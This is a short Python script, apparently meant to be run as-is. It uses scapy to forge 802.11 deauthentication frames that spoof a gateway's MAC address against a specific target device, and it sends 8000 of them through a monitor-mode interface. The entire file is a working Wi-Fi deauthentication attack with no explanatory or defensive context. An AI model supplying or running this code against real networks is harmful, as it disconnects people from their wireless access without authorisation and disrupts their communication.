from scapy.all import *

target_mac = "98:09:cf:1a:12:ab"
gateway_mac = "00:11:32:D3:0C:09"

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

sendp(packet, inter=0.05, count=8000, iface="wlan0mon", verbose=1)
